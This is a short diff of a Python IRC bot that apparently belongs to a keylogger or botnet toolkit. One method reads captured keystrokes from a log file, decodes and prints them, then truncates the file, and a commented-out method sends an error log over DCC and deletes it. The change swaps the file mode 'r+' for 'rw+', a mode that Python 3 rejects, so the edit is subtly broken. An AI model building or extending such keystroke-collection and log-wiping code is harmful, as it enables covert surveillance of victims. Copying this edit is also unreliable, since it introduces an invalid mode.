@@ -102,7 +102,7 @@ class Bot(irc.bot.SingleServerIRCBot):
     # Translate and print the keylog to console. Once finished, deletes file.
     def keylogs(self):
         evlog = '/opt/col_log/evlog.txt'
-        log = open(evlog, 'r+')
+        log = open(evlog, 'rw+')
         f = log.read()
         kl = key.translate(f)
         log.truncate()
@@ -113,7 +113,7 @@ class Bot(irc.bot.SingleServerIRCBot):
     def error_log(self):
         # SEND ERROR LOG VIA DCC THEN DELETE
         # errlog = '/opt/col_log/log.txt'
-        # f = open(errlog, 'r+')
+        # f = open(errlog, 'rw+')
         # f.truncate()
         # f.close()
         pass
